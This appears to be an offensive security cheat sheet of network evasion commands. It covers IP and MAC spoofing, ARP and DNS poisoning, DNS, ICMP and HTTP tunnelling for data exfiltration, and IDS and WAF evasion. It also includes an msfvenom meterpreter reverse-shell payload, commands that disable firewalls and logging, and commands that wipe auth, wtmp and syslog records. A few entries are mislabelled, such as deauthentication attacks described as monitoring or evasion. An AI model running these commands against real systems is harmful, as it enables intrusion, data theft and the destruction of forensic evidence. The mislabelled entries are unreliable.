# Packet Manipulation

#### IP Spoofing
Changing the source IP address to evade detection or impersonate another device. This sends TCP packets with a spoofed IP, making it harder for network monitoring to track the source.

- **`ifconfig` IP Spoof:**
	```bash
	sudo ifconfig <interface> <spoofed_ip> netmask <netmask>
	```
- **`ip addr` IP Spoof:**
	```bash
	sudo ip addr add <spoofed_ip>/<cidr> dev <interface>
	```
- **HPing3 IP Spoof:**
	```bash
	hping3 --spoof <spoofed_ip> -S -p <target_port> <target_ip>
	```
- **NPing IP Spoof:**
	```bash
	sudo nping --icmp -S <spoofed_ip> <target_ip>
	```

#### MAC Address Spoofing
Changing your MAC address to bypass network access control or evade detection.

- **`ifconfig` MAC Spoof - Temporary:**
	```bash
	sudo ifconfig eth0 hw ether 00:11:22:33:44:55
	```
- **`macchanger`MAC Spoof - Permanent:**
	```bash
	sudo macchanger -m 00:11:22:33:44:55 eth0
	```

#### Hostname Spoofing
- **`hostname` Hostname Change - Temporary:**
	```bash
	sudo hostname <new_hostname>
	```
- **`hostnamectl` Hostname Change - Permanent:**
	```bash
	sudo hostnamectl set-hostname <new_hostname>
	```

#### TTL Manipulation
Modifying Time-To-Live (TTL) values to confuse IDS/IPS or evade network monitoring systems. Some monitoring systems might rely on TTL values to track the source, and changing it can disrupt this.
  
- **HPing3 TTL Manipulation:** 
	```bash
	hping3 -t <ttl_value> -S <target_ip> -p <target_port>
	```

#### Packet Fragmentation
Split packets to evade detection systems that cannot reassemble fragmented packets properly. This may evade basic IDS/IPS rules if they do not reassemble fragmented traffic.

- **Fragmented Packet Scans:** 
	```bash
	nmap -f <target_ip>
	```

#### User-Agent Spoofing
- **Spoof User-Agent Strings in Web Requests:**
	```bash
	curl -A "Mozilla/5.0" http://<target_ip>
	```
- **Use legitimate-looking User-Agent string:**
	```bash
	curl --header "User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36" <target_url>
	```
- **Set a Custom User-Agent with Wget:**
	```bash
	wget --user-agent="Mozilla/5.0" http://<target_ip>
	```

#### Custom Packet Crafting
- **Inject Custom Headers into Network Traffic:**
	```bash
	scapy
	packet = IP(dst="target_ip")/TCP(dport=80,flags="S")/Raw(load="GET / HTTP/1.1\r\nX-Custom-Header: custom\r\n\r\n")
	send(packet)
	```

# Network Traffic Encryption

#### Proxychains
- **Chain Proxies for Enhanced Anonymity:**
	```bash
	proxychains4 curl http://<target_ip>
	proxychains4 wget http://<target_ip>
	proxychains -f /etc/proxychains.conf ssh user@<target_ip>
	```

#### SSH Tunneling
- **SSH Tunneling (Dynamic Port Forwarding - SOCKS Proxy):** Set up a SOCKS proxy on the local machine that forwards all traffic through the SSH connection to the target machine. Useful for browsing internal networks.
	```bash
	ssh -D <local_port> <username>@<pivot_ip>
	```
- **SSH Tunneling (Local Port Forwarding):** Forward traffic from a local port to a remote service on the target machine. Useful for accessing services hidden behind a firewall
	```bash
	ssh -L <local_port>:<remote_ip>:<remote_port> <username>@<pivot_ip>
	```
- **SSH Tunneling (Remote Port Forwarding):** Expose a local service (on the attacker's machine) to the target's network.
	```bash
	ssh -R <remote_port>:<local_ip>:<local_port> <username>@<pivot_ip>
	```
- **SSH Pivoting Using ProxyJump:** Jump through an intermediary system to reach the target host, leveraging compromised SSH credentials
	```bash
	ssh -J <pivot_ip> <username>@<target_ip>
	```

#### VPN Tunneling
Establish a VPN tunnel to hide network traffic from monitoring systems. Encrypts traffic between the attacker’s machine and the jump host, making it harder for IDS/IPS to inspect.

  - **OpenVPN VPN Tunnel:**
	```bash
	sudo openvpn --config /path/to/vpn_config.ovpn
	```
- **`ip route` Route Specific Traffic Through a VPN:**
	```bash
	sudo ip route add <target_network> via <vpn_gateway>
	```
- **Stunnel SSL/TLS Tunnel:** Use `stunnel` to encrypt traffic using SSL/TLS. This wraps any traffic over SSL/TLS, obfuscating the payload from network detection systems.
	- **Configuration example:**
    ```
    [https]
    client = yes
    accept = 443
    connect = <target_ip>:<target_port>
    ```

#### Tor Network
Route traffic through the Tor network to obfuscate its origin. Tor anonymizes the traffic, making it difficult for network monitoring systems to track its origin.
- **Route All Traffic Through Tor:**
	```bash
	torify curl http://<target_ip>
	torify wget http://<target_ip>
	```

# Layered Encryption and Proxying
Layered encryption and proxying are powerful techniques used to add multiple layers of obfuscation to network traffic, making it harder for defenders to trace or inspect the communication. Below are practical examples of layered encryption and proxying strategies for defense evasion.

#### Double VPN
In this setup, traffic is routed through two VPN servers. This provides two layers of encryption and IP obfuscation, making it difficult for monitoring systems to trace the original source of traffic.

1. **Start VPN1 (First Layer of Encryption):**
	- Download and configure the first VPN client configuration (`vpn1.ovpn`).
	- Start the VPN connection to the first server.
	    ```bash
	    sudo openvpn --config vpn1.ovpn
	    ```
2. **Once VPN1 is connected, all traffic is encrypted and routed through the first VPN server**
3. **Start VPN2 (Second Layer of Encryption) Inside VPN1:**
	- Download and configure the second VPN client configuration (`vpn2.ovpn`).
	- Start the second VPN connection, this time from inside the first VPN tunnel.
	    ```bash
	    sudo openvpn --config vpn2.ovpn
	    ```
Now your traffic is routed through two different VPNs, providing two layers of encryption. Even if the first VPN is compromised, the second layer of encryption and IP obfuscation remains in place.

#### SSH Over Tor
By routing SSH traffic through the Tor network, this method hides both the attacker's IP address and the SSH connection from the monitoring systems.

1. **Start the Tor service:**
	- Ensure the Tor service is running on your system.
	    ```bash
	    sudo systemctl start tor
	    ```
2. **Use `torify` to route SSH traffic through the Tor network**
	- `torify` is a wrapper that routes any command through Tor’s SOCKS proxy.
	    ```bash
	    torify ssh <user>@<target_ip>
	    ```
	- **Example:**
	```bash
	torify ssh user@192.168.1.20
	```
This command sends the SSH connection through the Tor network, effectively anonymizing your IP and encrypting your communication.

#### Stunnel (SSL/TLS Tunneling)
Stunnel allows you to encrypt non-SSL traffic using SSL/TLS. In this example, we'll tunnel a Netcat session over SSL/TLS using Stunnel.

1. **Install Stunnel:**
	```bash
	sudo apt-get install stunnel4
	```
2. **Configure Stunnel on the Server (Target):**
	- Create a Stunnel configuration file `/etc/stunnel/stunnel.conf`:
	    ```
	    [netcat]
	    accept = 443
	    connect = 127.0.0.1:4444
	    cert = /etc/stunnel/stunnel.pem
	    ```
	- Generate an SSL certificate:
	    ```bash
	    openssl req -new -x509 -days 365 -nodes -out /etc/stunnel/stunnel.pem -keyout /etc/stunnel/stunnel.pem
	    ```
	- Start Stunnel on the server:
	    ```bash
	    sudo stunnel /etc/stunnel/stunnel.conf
	    ```
3. **Start Netcat Listener on the Server:**
	```bash
	nc -lvp 4444
	```
4. **Configure and Connect Stunnel on the Client (Attacker):**
	- On the attacker's machine, create a Stunnel configuration file `/etc/stunnel/stunnel-client.conf`:
	    ```
	    client = yes
	    [netcat]
	    accept = 127.0.0.1:5555
	    connect = <target_ip>:443
	    ```
	- Start Stunnel on the attacker's machine:
	    ```bash
	    sudo stunnel /etc/stunnel/stunnel-client.conf
	    ```
5. **Connect to the SSL-encrypted Netcat session:**
	```bash
	nc 127.0.0.1 5555
	```
Now, any traffic between the client and server is routed through the SSL/TLS tunnel, protecting it from inspection and evading detection by network monitoring systems.

#### SSH Tunneling
SSH tunneling can be used to forward local traffic to a remote server, which can be useful for evading network-based firewalls or proxies that block certain services.

1. **Set up the SSH Tunnel (Local Port Forwarding):**
	- On the attacker's machine, run the following command to forward a local port to a remote machine's port via an intermediary SSH server.
	    ```bash
	    ssh -L <local_port>:<target_ip>:<target_port> <user>@<jump_host_ip>
	    ```
	- **Example:**
	```bash
	ssh -L 8080:192.168.1.20:80 user@10.0.0.5
	```
	- This command forwards port `8080` on the attacker's machine to port `80` on the target (`192.168.1.20`), using the `jump_host` (`10.0.0.5`) as the intermediary.
2. **Access the Remote Web Server:**
	- Open a web browser or use `curl` to access the remote web server via the local port:
	    ```bash
	    curl http://localhost:8080
	    ```
Now, all traffic between the attacker and the remote target is encrypted inside the SSH tunnel, bypassing network monitoring systems.

#### ProxyChains for Layered Proxying
ProxyChains allows you to route your traffic through multiple proxy servers, obfuscating the origin and adding multiple layers of anonymity.

1. **Install ProxyChains:**
	```bash
	sudo apt-get install proxychains
	```
2. **Configure ProxyChains**
	- Edit the `/etc/proxychains.conf` file to specify the chain of proxies you want to use.
	    ```
	    # Dynamic Chain (Failover)
	    dynamic_chain
	
	    [ProxyList]
	    # Add multiple proxies here
	    socks5 127.0.0.1 9050  # Tor SOCKS5 Proxy
	    http  192.168.1.10 8080 # HTTP Proxy
	    ```
3. **Start Tor Service (Optional):**
	- If using Tor, start the Tor service:
	    ```bash
	    sudo systemctl start tor
	    ```
4. **Use ProxyChains to Tunnel Your Traffic:**
	- Now, you can use `proxychains` to route any traffic through the configured proxy chain.
	    ```bash
	    proxychains <command>
	    ```
	- **Example:**
	```bash
	proxychains nmap -sT <target_ip>
	```
This command sends the Nmap scan through the proxy chain, hiding the origin and allowing evasion of network monitoring systems like IDS/IPS.

# Covert Channels

#### Port Forwarding
- **SSH tunneling to bypass firewalls:**
	```bash
	ssh -L <local_port>:<remote_ip>:<remote_port> <user>@<host>
	```
- **`socat` Port forward for Bidirectional Communication:**
	```bash
	socat TCP4-LISTEN:<local_port>,fork TCP4:<remote_host>:<remote_port>
	```
- **`socat` Encrypted Tunnel:**
	```bash
	socat OPENSSL-LISTEN:<local_port>,cert=<cert.pem>,key=<key.pem>,verify=0 TCP:<target_ip>:<remote_port>
	```

#### DNS Tunneling
Encapsulating malicious traffic within DNS requests to bypass firewalls and evade detection. DNS is typically less scrutinized by IDS/IPS, making it an ideal channel for exfiltration.

- **Using `dns2tcp` Server (attacker):**
	```bash
	dns2tcpd -F /etc/dns2tcpd.conf
	```
- **Using `dns2tcp` Client (target):**
	```bash
	dns2tcpc -r <file> -z <attack_ip>
	```
- **Create a Covert DNS Tunnel Using `iodine`:**
	```bash
	sudo iodine -f <domain_name> <dns_server_ip>
	```
  
#### ICMP Tunneling
  Exfiltrate data over ICMP, which is often allowed through firewalls. ICMP traffic may be ignored by many network security devices, making it a useful channel for data exfiltration.

- **Using `icmpsh` Server (attacker):**
	```bash
	icmpsh -t <target_ip> -d <attack_ip>
	```
- **Using `icmpsh` Client (target):**
	```bash
	icmpsh-m -t <attack_ip> -c <command>
	```
  - **`ptunnel`ICMP Tunneling:**
	```bash
	ptunnel -p <gateway_ip> -da <target_ip> -dp <target_port>
	```  
- **`icmpssh` ICMP Tunnelling:**
	```bash
	icmpsh -t <target_ip> -d <local_ip>
	```

#### HTTP/HTTPS Traffic Obfuscation
HTTPS traffic is encrypted, making it more difficult for network security tools to inspect. Route traffic through multiple proxies to obfuscate network connections. By routing traffic through proxies, it becomes much more difficult for monitoring systems to track the origin.

- **`stunnel` HTTPS Tunneling:**
	```bash
	stunnel /etc/stunnel/stunnel.conf
	```
- **`htcat` HTTP Data Exfiltration:**
	```bash
	htcat http://target.com/upload -m PUT -d /path/to/exfiltrate.file
	```
- **Send HTTP Requests with Random Delays:**
	```bash
	while true; do curl -A "Mozilla/5.0" http://target.com; sleep $((RANDOM % 10)); done
	```
- **Use `burpsuite` to Modify and Obfuscate Web Traffic:**
	- Proxy your traffic through Burp Suite and use its features to modify HTTP requests, add random headers, and obfuscate content.
- **Proxychains:**
	```bash
	proxychains <command>
	```
  - **`curl` HTTPS Data Exfiltration:**
```bash
curl --data "<data>" https://<target_server>
```

#### WebSocket Tunneling
Use WebSocket connections to bypass firewalls and network filters. WebSockets often bypass traditional inspection methods as they are bidirectional and use a persistent connection over standard ports (80/443).

- **WebSocket Tunnelling with `wstunnel`:**
	```bash
	wstunnel -r <target_ip>:<target_port> ws://<attacker_ip>:<attacker_port>
	```

#### Web Proxy
Leverage web proxies (HTTP/HTTPS) to tunnel traffic and avoid firewall inspection. Bypasses firewall restrictions that may be blocking certain network traffic.
- **`export` Web Proxying:**
	```bash
	export http_proxy=http://<proxy_ip>:<proxy_port>
	```
- **`proxytunnel` HTTP Web Proxy Tunneling:**
	```bash
	proxytunnel -p proxy.example.com:8080 -d target.example.com:22 -a 2222
	```

#### HTTP Obfuscation via Domain Fronting

- **Domain Fronting:** Use legitimate, high-trust domains (like Google or Amazon) to tunnel traffic and bypass network filters. The initial request is directed to a legitimate domain, but traffic is eventually routed to a malicious domain, bypassing IDS/IPS systems.
- **Domain Fronting with `curl`:**
	```bash
	curl -H "Host: <malicious_host>" https://<legitimate_host>
	```

#### Custom Protocol Encapsulation
- **`dnscat2` Encapsulation TCP Traffic Over DNS:**
	```bash
	dnscat2 <dns_server_ip>
	```
- **`icmpsh` Encapsulation Data in ICMP Packets:**
	```bash
	sudo ./icmpsh -t <target_ip> -d <local_ip>
	```

#### Steganography in Network Traffic
- **Hide Data in DNS Queries Using `dns2tcp`:**
	```bash
	dns2tcpc -z -r <tunnel.dns.server> <target>
	```
- **Exfiltrate Data Hidden in HTTP Headers:** Embed data in HTTP headers to exfiltrate information without raising alarms.
	```bash
	curl -H "X-Data: $(base64 secret.txt)" http://<target_ip>
	```

# DNS Evasion and Manipulation

#### DNS Spoofing
- **Spoof DNS Responses with `dnsspoof`:**
	```bash
	sudo dnsspoof -i eth0 -f /path/to/hosts.txt
	```

#### Modify DNS Resolution
- **Change DNS server:**
	```bash
	sudo bash -c 'echo "nameserver <malicious_dns>" > /etc/resolv.conf'
	```
- **Spoof DNS resolution:**
	```bash
	sudo bash -c 'echo "<malicious_ip> <target_domain>" >> /etc/hosts'
	```

####  Flush DNS Cache
- **Flush systemd-resolved DNS cache:**
	```bash
	sudo systemd-resolve --flush-caches
	```
- **Restart dnsmasq to clear its DNS cache:**
	```bash
	sudo service dnsmasq restart
	```

#### DNS Cache Poisoning
Poison the DNS cache to redirect legitimate traffic to malicious servers.
- **Poison DNS Cache with `ettercap`:**
	```bash
	ettercap -T -q -P dns_spoof -i eth0
	```
- **Use `dnschef` for DNS Spoofing:**
	```bash
	dnschef --fakeip <fake_ip> --interface eth0
	```

#### DNS Query Padding
Add random bytes to DNS queries to evade detection based on payload size.
- **`dnschef` for DNS padding:**
	```bash
	dnschef --fakeip=<attacker_ip> --pad-dns=YES
	```

#### Using Alternative DNS Resolvers
- **Change DNS Server Temporarily:**
	```bash
	sudo bash -c 'echo "nameserver 1.1.1.1" > /etc/resolv.conf'
	```
- **Use Public DNS with `dig`:**
	```bash
	dig @1.1.1.1 <domain>
	```

#### Obfuscating DNS Queries
- **Use DNSCrypt for Encrypted DNS Queries:**
	```bash
	dnscrypt-proxy --resolver-name=dnscrypt.eu-nl
	```
- **Tunnel DNS Requests Through a VPN:**
	```bash
	sudo openvpn --config /etc/openvpn/client.conf --dhcp-option DNS 8.8.8.8
	```
- **Use `dnsrecon` for Passive DNS Enumeration:**
	```bash
	dnsrecon -r 192.168.1.0/24 -t passive
	```
- **Use `dig` with TCP to Bypass Filters:**
	```bash
	dig @<dns_server> <domain> +tcp
	```

# Manipulating ARP Cache

#### Clear ARP Cache
- **Flush the entire ARP cache:**
	```bash
	sudo ip -s -s neigh flush all
	```

#### Poison ARP Cache
- **Manually add a spoofed entry to the ARP cache:**
	```bash
	sudo arp -s <target_ip> <spoofed_mac>
	```
- **ARP spoofing using arpspoof tool:**
	```bash
	sudo arpspoof -i <interface> -t <target_ip> -r <gateway_ip>
	```

# Network Reconnaissance Evasion

#### Throttling Network Scans and Enumeration
Reduce scan speed to avoid triggering IDS/IPS threshold alerts. Slow scanning techniques like `-T0` in Nmap reduce the likelihood of triggering network-based alarms by generating less traffic over time.

- **Conduct a Slow Scan with `nmap`:**
	```bash
	sudo nmap -T0 -sS <target_ip>
	```
- **Perform a Scan Using Decoy Hosts:**
	```bash
	sudo nmap -D RND:10 <target_ip>
	```
- **Use `hping3` for Stealthy Packet Injection:**
	```bash
	hping3 -S <target_ip> -p 80 -i u3000
	```

#### Randomized Port Scanning
Randomize the port scanning order to avoid detection by IDS/IPS. Randomizing the port order and lowering the scan speed to evade signature-based detection.
- **Nmap Randomization Scan:**
	```bash
	nmap -T2 --randomize-hosts --top-ports 100 <target_ip>
	```

#### Evading Detection During Network Reconnaissance
- **Conduct Passive Reconnaissance Using `p0f`:**
	```bash
	sudo p0f -i eth0 -p -o p0f.log
	```
- **Use `passivedns` to Collect DNS Information Stealthily:**
	```bash
	sudo passivedns -i eth0 -l
	```

#### Decoy and False Flagging
- **Decoy Traffic:** Generate decoy traffic to overwhelm network monitoring systems. Use `nmap -D` to add decoys in an Nmap scan, confusing monitoring systems.
	```bash
	nmap -D RND:10 <target_ip>
	```
- **IP Randomization:** Use random source IPs to confuse detection systems.
	```bash
	hping3 -a <spoofed_ip_range> -S <target_ip> -p <target_port>
	```

# Firewall Evasion Techniques

#### Disable Firewall (Temporary)
This can be used to block traffic selectively, making it harder for monitoring tools to detect outgoing connections.

- **Stops firewalld service (RHEL-based systems):**
	```bash
	sudo systemctl stop firewalld
	```
- **Stops UFW firewall (Debian-based systems):**
	```bash
	sudo systemctl stop ufw
	```
- **Flushes all IPv4 iptables rules:**
	```bash
	sudo iptables -F
	```
- **Flushes all IPv6 iptables rules:**
	```bash
	sudo ip6tables -F
	```
- **IPTables Rules Manipulation:**
	```bash
	sudo iptables -A OUTPUT -p tcp --dport <port> -j DROP
	```

#### Modify Firewall Rules
- **Sets default policy for INPUT to ACCEPT:**
	```bash
	sudo iptables -P INPUT ACCEPT
	```
- **Deletes a specific DROP rule in INPUT chain:**
	```bash
	sudo iptables -D INPUT -j DROP
	```
- **Deletes a specific DROP rule in IPv6 INPUT chain:**
	```bash
	sudo ip6tables -D INPUT -j DROP
	```

# Load Balancer and Web Application Firewall (WAF) Evasion

#### WAF Evasion
Use WAF bypass techniques like encoding payloads, modifying request headers, or splitting payloads.

- **URL Encoding:** Encode characters in a payload to evade detection.
	```bash
	curl 'http://<target_ip>?cmd=%2Fbin%2Fsh'
	```
- **Double Encoding:** Apply encoding multiple times to bypass WAF filters.
	```bash
	%25%32%46%25%32%45%25%31%31%25%32%45
	```

#### Load Balancer Misconfigurations
Exploit load balancers that forward traffic based on rules. Attempt to target internal services by abusing load balancing headers such as `X-Forwarded-For`.
- **Custom packet crafting with `curl`:**
	```bash
	curl -H "X-Forwarded-For: 127.0.0.1" http://<load_balancer_ip>
	```

# IDS/IPS Evasion

#### Evasion via Polymorphic Techniques
Crafting custom packets can help evade IDS/IPS detection by altering standard packet fields.
- **Scapy Packet Crafting:** Craft custom packets to evade signature-based detection.
    ```python
    from scapy.all import *
    packet = IP(dst="192.168.1.20")/TCP(dport=80, flags="S")
    send(packet)
    ```
- **Scapy Packet Crafting to Obfuscate Traffic with Random Encodings:**
	```bash
	from scapy.all import *
	packet = IP(dst="<target_ip>")/TCP(dport=80)/Raw(load=b"\x90" * 10 + b"GET / HTTP/1.1\r\nHost: <target_ip>\r\n\r\n")
	send(packet)
	```
- **Scapy example to randomize TTL and IP ID:** Randomize packet fields (TTL, IP ID, Sequence Numbers) to make traffic appear different with each execution. This makes it harder for network monitoring systems to match traffic patterns and signatures.
	```bash
	from scapy.all import *
	for i in range(10):
	    packet = IP(dst="192.168.1.20", ttl=RandByte(), id=RandShort())/TCP(dport=80, flags="S")
	    send(packet)
	```
- **Metasploit Encoder:** Use encoders to obfuscate payloads and avoid IDS/IPS detection. Encoders like `shikata_ga_nai` can be used to evade IDS/IPS by obfuscating the payload.
	```bash
	msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=<attack_ip> LPORT=<attack_port> -e x86/shikata_ga_nai -f elf > shell.elf
	```

#### Signature-Based Detection Evasion
- **Modify Payloads:** Use payload encoding or modify common attack signatures to evade signature-based detection.
	```bash
	echo -n 'payload' | base64
	```
- **Obfuscate Packet Payloads with `Scapy`:**
	```bash
	from scapy.all import *
	packet = IP(dst="<target_ip>")/TCP(dport=80)/Raw(load="GET / HTTP/1.1\r\nHost: <target_ip>\r\n\r\n")
	send(packet)
	```
- **Split Attack Chains:** Break up attack steps to avoid detection by IDS/IPS. Instead of executing a full attack script in one go, break it into multiple commands that are executed over time, making it harder for the IDS to recognize patterns.

#### Port Knocking
A stealthy method to open ports by making a sequence of connection attempts to closed ports. 
- **Implement Port Knocking to Open a Port:**
	```bash
	knock <target_ip> 1234 5678 9101 ssh user@<target_ip>
	```
- **Scripted Port Knocking:**
	```bash
	for port in 1234 5678 9101; do
	  nc -zv <target_ip> $port;
	  sleep 1;
	done
	ssh user@<target_ip>
	```
- **Implement Time-Based Port Knocking:**
	```bash
	knockd -c knockd.conf
	```

#### Network Time Manipulation
- **NTP Misinformation:** Manipulate NTP settings to evade time-based correlation in IDS/IPS systems. By altering time synchronization, you can desynchronize logging and detection systems.
	```bash
	ntpdate -u <attacker_ntp_server>
	```

# Disabling or Manipulating Network Services

#### Disable Network Services Temporarily
- **Stops SSH service:**
	```bash
	sudo systemctl stop ssh
	```
- **Stops Apache HTTP service:**
	```bash
	sudo systemctl stop apache2
	```
- **Stops Nginx HTTP service:**
	```bash
	sudo systemctl stop nginx
	```

#### Modify SSH Configuration
- **Disables root login via SSH:**
	```bash
	sudo sed -i 's/^PermitRootLogin .*/PermitRootLogin no/' /etc/ssh/sshd_config
	```
- **Disables password authentication:**
	```bash
	sudo sed -i 's/^PasswordAuthentication .*/PasswordAuthentication no/' /etc/ssh/sshd_config
	```
- **Restart SSH service to apply changes:**
	```bash
	sudo systemctl restart ssh
	```

# Covering Tracks in Active Network Connections

#### Kill Specific Connections
- **Identify connections to target IP:**
	```bash
	sudo netstat -antp | grep <target_ip>
	```
- **Kill the process associated with a specific connection:**
	```bash
	sudo kill <pid>
	```

#### Drop Specific Connections
- **Drop outbound connections to a specific IP:**
	```bash
	sudo iptables -A OUTPUT -d <target_ip> -j DROP
	```
- **Drop inbound connections from a specific IP:**
	```bash
	sudo iptables -A INPUT -s <target_ip> -j DROP
	```

# Anti-Forensics and Data Destruction

#### Secure Data Deletion
- **Securely Delete Sensitive Files:**
	```bash
	shred -u /path/to/sensitive_file
	```

#### Removing Network Artifacts
- **Clear ARP Cache:**
	```bash
	sudo ip -s -s neigh flush all
	```
- **Clear SSH Known Hosts:**
	```bash
	>~/.ssh/known_hosts
	```
- **Wipe Connection Logs:**
	```bash
	sudo sh -c 'cat /dev/null > /var/log/wtmp; cat /dev/null > /var/log/btmp; cat /dev/null > /var/log/lastlog'
	```
- **Remove Evidence from ARP Tables:**
	```bash
	sudo ip -s -s neigh flush all
	```

#### Disable Logging Temporarily
- **Stops the rsyslog service temporarily:**
	```bash
	sudo systemctl stop rsyslog
	```
- **Stops the syslog service temporarily:**
	```bash
	sudo systemctl stop syslog
	```

#### Clear System Logs
- **Clears authentication log (Debian-based systems):**
```bash
sudo bash -c '> /var/log/auth.log'
```
- **Clears authentication log (RHEL-based systems):**
```bash
sudo bash -c '> /var/log/secure'
```
- **Clears system log:**
```bash
sudo bash -c '> /var/log/syslog'
```
- **Clears general log messages:**
```bash
sudo bash -c '> /var/log/messages'
```

# Evasion in Wireless Networks

#### MAC Address Randomization
- **Randomize MAC Address on Wi-Fi Interfaces:**
	```bash
	sudo macchanger -r wlan0
	```
- **Randomize MAC Address on Reconnect:**
	```bash
	sudo nmcli device modify wlan0 wifi.cloned-mac-address random
	```
- **Randomize MAC Address on Every Connection:**
	```bash
	nmcli connection modify <connection_name> 802-11-wireless.cloned-mac-address random
	nmcli connection up <connection_name>
	```
- **Use a MAC Address from a Different Manufacturer:**
	```bash
	sudo macchanger -m 00:11:22:33:44:55 wlan0
	```

#### Deauthentication Attack Evasion
- **Evade Deauthentication Attacks:**
	```bash
	wpa_cli reassociate
	```
- **Monitor for Deauthentication Frames:**
	```bash
	aireplay-ng --deauth 10 -a <AP_MAC> -c <victim_MAC> wlan0mon
	```

#### Evading Wireless IDS
- **Send Deauth Frames to Evade Detection:**
	```bash
	aireplay-ng --deauth 10 -a <AP_MAC> wlan0
	```
- **Send Fake Probe Requests to Distract IDS:**
	```bash
	mdk3 wlan0 p -t <target_ssid>
	```

#### Cloaking Wireless Traffic
- **Hide SSID Broadcasts to Evade Detection:**
	```bash
	iwconfig wlan0 essid "HiddenNetwork"
	```
- **Use WPA3-Personal to Encrypt Wireless Traffic:**
	```bash
	wpa_passphrase "network_name" "password" > /etc/wpa_supplicant.conf
	wpa_supplicant -B -i wlan0 -c /etc/wpa_supplicant.conf
	```
